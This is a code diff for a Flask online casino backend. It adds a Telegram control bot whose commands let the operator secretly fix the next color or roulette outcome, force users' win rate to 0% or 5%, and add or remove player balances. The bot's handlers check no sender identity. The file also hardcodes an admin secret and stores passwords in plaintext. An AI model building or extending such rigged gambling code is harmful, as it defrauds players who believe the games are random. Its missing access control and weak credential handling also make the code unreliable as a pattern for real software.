@@ -4,6 +4,7 @@ import random
 import subprocess
 import sys
 import time
+import threading
 from dotenv import load_dotenv
 from flask import (
     Flask,
@@ -16,6 +17,7 @@ from flask import (
 import psycopg2
 from psycopg2.extras import RealDictCursor
 from waitress import serve
+import telebot
 
 load_dotenv()
 
@@ -34,6 +36,10 @@ if DB_URL and DB_URL.startswith("postgres://"):
 MINIMUM_BET = 100.0  # Minimum Bet Rule Set to ₹100
 ADMIN_SECRET = "SUPER_SECRET_KEY_123"  # Admin Secret Token
 
+# Telegram Bot Setup
+BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE")
+bot = telebot.TeleBot(BOT_TOKEN)
+
 # Mapping color choices to outcome options in sub-folders
 COLOR_VIDEOS = {
     "red": ["redcenter.mp4", "redleft.mp4", "redright.mp4"],
@@ -48,11 +54,15 @@ ALL_OUTCOME_VIDEOS = [
     "greencenter.mp4", "greenleft.mp4", "greenright.mp4"
 ]
 
-# Global Master Admin Controls
+# Global Master Admin Controls & System State
 admin_settings = {
-    "global_win_rate": 0.25,  # 25% Base RTP
-    "emergency_lock": False,  # Forced Loss Mode
-    "forced_outcome": None,  # Admin Override Outcome
+    "global_win_rate": 0.25,      # 25% Base RTP
+    "emergency_lock": False,      # Forced Loss Mode
+    "house_boost": False,         # Extra House Edge Boost Mode
+    "stop_all_games": False,      # Pause All Games Flag
+    "stop_wheel_game": False,     # Pause Wheel/Color Game Flag
+    "forced_outcome": None,       # Admin Color Override (red, green, blue)
+    "forced_roulette_num": None,  # Admin Roulette Override (1-36)
 }
 
 last_round_winner = {"color": None}
@@ -139,6 +149,9 @@ def calculate_user_win_probability(user_data):
     if admin_settings["emergency_lock"]:
         return 0.0  # 100% Loss Mode (Emergency)
 
+    if admin_settings["house_boost"]:
+        return 0.05 # Forced 5% Win Rate in House Advantage Boost Mode
+
     balance = float(user_data.get("balance", 0.0))
     wagered = float(user_data.get("total_wagered", 0.0))
     won = float(user_data.get("total_won", 0.0))
@@ -186,6 +199,158 @@ def update_daily_stats(amount, payout=0.0):
         conn.close()
     except Exception as e:
         print("Error updating daily stats:", e)
+
+
+# =====================================================================
+# --- TELEGRAM CONTROL BOT SYSTEM ---
+# =====================================================================
+
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    help_text = (
+        "🎮 **OMM Casino - Control Panel** 🎮\n\n"
+        "**Game Controls (Outcome Manipulation):**\n"
+        "🔴 `/red` - Agla round RED play hoga\n"
+        "🟢 `/green` - Agla round GREEN play hoga\n"
+        "🔵 `/blue` - Agla round BLUE play hoga\n"
+        "🎯 `/num <1-36>` - Roulette par next winning number fix karein\n\n"
+        "**Account & Balance Controls:**\n"
+        "➕ `/create_id <username> <password>`\n"
+        "💰 `/add_bal <username> <amount>`\n"
+        "💸 `/minus_bal <username> <amount>`\n\n"
+        "**Emergency & System Controls:**\n"
+        "🔒 `/lock` - Emergency lock (Users ki win rate 0% kar dega)\n"
+        "🏛️ `/house` - House edge boost (House profit mode)\n"
+        "🛑 `/stopall` - Sabhi games ko stop karein\n"
+        "🎡 `/stopwheel` - Sirf Wheel / Color game stop karein\n"
+        "▶️ `/startall` - Sabhi stopped games start karein\n"
+        "🔄 `/auto` - Manual outcome override clear karke Normal Algorithm activate karein"
+    )
+    bot.reply_to(message, help_text, parse_mode="Markdown")
+
+@bot.message_handler(commands=['red', 'green', 'blue'])
+def fix_color_outcome(message):
+    chosen_color = message.text.replace("/", "").strip().lower()
+    admin_settings["forced_outcome"] = chosen_color
+    bot.reply_to(message, f"🎯 **Agla Outcome Fix:** Video folder `{chosen_color}` se play hogi!", parse_mode="Markdown")
+
+@bot.message_handler(commands=['num'])
+def fix_roulette_outcome(message):
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "⚠️ Usage: `/num <1 to 36>`", parse_mode="Markdown")
+        return
+    try:
+        num = int(args[1])
+        if 1 <= num <= 36:
+            admin_settings["forced_roulette_num"] = num
+            bot.reply_to(message, f"🎯 **Agla Roulette Number Fix:** `{num}`", parse_mode="Markdown")
+        else:
+            bot.reply_to(message, "❌ Number 1 se 36 ke beech hona chahiye!")
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid number format!")
+
+@bot.message_handler(commands=['create_id'])
+def handle_create_id(message):
+    args = message.text.split()
+    if len(args) < 3:
+        bot.reply_to(message, "⚠️ Usage: `/create_id <username> <password>`")
+        return
+    username, password = args[1], args[2]
+    conn = get_db()
+    cursor = conn.cursor()
+    try:
+        cursor.execute("INSERT INTO users (username, password, balance) VALUES (%s, %s, 100.0)", (username, password))
+        conn.commit()
+        bot.reply_to(message, f"✅ Account `{username}` successfully created with ₹100 initial balance!", parse_mode="Markdown")
+    except Exception as e:
+        conn.rollback()
+        bot.reply_to(message, f"❌ Error: Username pehle se taken hai!")
+    finally:
+        cursor.close()
+        conn.close()
+
+@bot.message_handler(commands=['add_bal'])
+def handle_add_balance(message):
+    args = message.text.split()
+    if len(args) < 3:
+        bot.reply_to(message, "⚠️ Usage: `/add_bal <username> <amount>`")
+        return
+    username = args[1]
+    try:
+        amount = float(args[2])
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid Amount!")
+        return
+
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET balance = balance + %s WHERE username = %s", (amount, username))
+    conn.commit()
+    cursor.close()
+    conn.close()
+    bot.reply_to(message, f"💰 Added ₹{amount} to `{username}`.")
+
+@bot.message_handler(commands=['minus_bal'])
+def handle_minus_balance(message):
+    args = message.text.split()
+    if len(args) < 3:
+        bot.reply_to(message, "⚠️ Usage: `/minus_bal <username> <amount>`")
+        return
+    username = args[1]
+    try:
+        amount = float(args[2])
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid Amount!")
+        return
+
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET balance = GREATEST(0.0, balance - %s) WHERE username = %s", (amount, username))
+    conn.commit()
+    cursor.close()
+    conn.close()
+    bot.reply_to(message, f"💸 Deducted ₹{amount} from `{username}`.")
+
+@bot.message_handler(commands=['lock'])
+def set_emergency_lock(message):
+    admin_settings["emergency_lock"] = True
+    bot.reply_to(message, "🔒 **Emergency Lock Activated!** Sabhi users ke winning rate 0% kar diye gaye hain.")
+
+@bot.message_handler(commands=['house'])
+def set_house_boost(message):
+    admin_settings["house_boost"] = True
+    bot.reply_to(message, "🏛️ **House Advantage Boosted!** Casino profit mode active.")
+
+@bot.message_handler(commands=['stopall'])
+def stop_all_games(message):
+    admin_settings["stop_all_games"] = True
+    bot.reply_to(message, "🛑 **Sare Games Stop Kar Diye Gaye Hain!**")
+
+@bot.message_handler(commands=['stopwheel'])
+def stop_wheel_game(message):
+    admin_settings["stop_wheel_game"] = True
+    bot.reply_to(message, "🎡 **Wheel / Color Game Temporarily Closed!**")
+
+@bot.message_handler(commands=['startall'])
+def start_all_games(message):
+    admin_settings["stop_all_games"] = False
+    admin_settings["stop_wheel_game"] = False
+    bot.reply_to(message, "▶️ **Sabhi Games Dobara Resume Kar Diye Gaye Hain!**")
+
+@bot.message_handler(commands=['auto'])
+def clear_forced_outcomes(message):
+    admin_settings["forced_outcome"] = None
+    admin_settings["forced_roulette_num"] = None
+    admin_settings["emergency_lock"] = False
+    admin_settings["house_boost"] = False
+    admin_settings["stop_all_games"] = False
+    admin_settings["stop_wheel_game"] = False
+    bot.reply_to(message, "🔄 Sabhi manual fixes aur locks hata diye gaye hain! **Normal Algorithm Active** hai.")
+
+def run_bot():
+    print("🤖 Telegram Control Bot Started...")
+    bot.infinity_polling()
 
 
 # =====================================================================
@@ -360,6 +525,9 @@ def update_balance():
 # --- PARITY GAME BACKEND ENGINE ---
 @app.route("/api/parity/place_bet", methods=["POST"])
 def parity_place_bet():
+    if admin_settings["stop_all_games"]:
+        return jsonify({"status": "error", "message": "Games stop kiye gaye hain!"}), 503
+
     if "user" not in session:
         return jsonify({"status": "error", "message": "Login Required!"}), 401
 
@@ -463,6 +631,9 @@ def verify_telegram_user():
 
 @app.route("/place_bet", methods=["POST"])
 def place_bet():
+    if admin_settings["stop_all_games"] or admin_settings["stop_wheel_game"]:
+        return jsonify({"status": "error", "message": "Wheel Game filhal closed hai!"}), 503
+
     if "user" not in session:
         return jsonify({"status": "error", "message": "Pehle Login Karein!"})
 
@@ -563,19 +734,24 @@ def place_bet():
 # --- UPDATED GET_GAME_STATE ---
 @app.route("/get_game_state")
 def get_game_state():
+    if admin_settings["stop_all_games"] or admin_settings["stop_wheel_game"]:
+        return jsonify({"status": "error", "message": "Game temporarily under maintenance!"}), 503
+
     global last_round_winner
     conn = get_db()
     cursor = conn.cursor()
 
     chosen = None
 
-    if admin_settings["emergency_lock"]:
-        chosen = random.choice(ALL_OUTCOME_VIDEOS)
-    elif admin_settings["forced_outcome"]:
+    # Priority 1: Telegram Override
+    if admin_settings["forced_outcome"]:
         target_color = admin_settings["forced_outcome"].lower()
         if target_color in COLOR_VIDEOS:
             chosen = random.choice(COLOR_VIDEOS[target_color])
-        admin_settings["forced_outcome"] = None
+        admin_settings["forced_outcome"] = None  # Played once, then return to normal/auto
+    # Priority 2: Emergency Lock
+    elif admin_settings["emergency_lock"]:
+        chosen = random.choice(ALL_OUTCOME_VIDEOS)
 
     is_user_win = False
     bet_amount = 0.0
@@ -686,6 +862,21 @@ def get_game_state():
             "balance": current_bal,
         }
     )
+
+
+# --- ROULETTE OUTCOME ENGINE WITH TELEGRAM CONTROL ---
+@app.route("/api/roulette/spin", methods=["POST"])
+def roulette_spin():
+    if admin_settings["stop_all_games"]:
+        return jsonify({"status": "error", "message": "Game temporarily disabled!"}), 503
+
+    if admin_settings["forced_roulette_num"] is not None:
+        number = admin_settings["forced_roulette_num"]
+        admin_settings["forced_roulette_num"] = None  # Played once, then return to normal
+    else:
+        number = random.randint(1, 36)
+
+    return jsonify({"status": "success", "winning_number": number})
 
 
 # --- CLAIM WINNINGS API ---
@@ -858,6 +1049,9 @@ def aviator_crash():
 
 @app.route("/api/mines/start", methods=["POST"])
 def mines_start():
+    if admin_settings["stop_all_games"]:
+        return jsonify({"status": "error", "message": "Games stop kiye gaye hain!"}), 503
+
     if "user" not in session:
         return jsonify({"status": "error", "message": "Login required"})
     data = request.json or {}
@@ -982,6 +1176,9 @@ def mines_loss():
 
 @app.route("/api/chicken/start", methods=["POST"])
 def chicken_start():
+    if admin_settings["stop_all_games"]:
+        return jsonify({"status": "error", "message": "Games stop kiye gaye hain!"}), 503
+
     if "user" not in session:
         return jsonify({"status": "error", "message": "Login required"})
     data = request.json or {}
@@ -1317,5 +1514,10 @@ def admin_update_balance():
 
 
 if __name__ == "__main__":
+    # Start Telegram Bot in a separate background thread
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
+
     print("🚀 Starting Flask Server on Port 5000...")
     serve(app, host="0.0.0.0", port=5000)
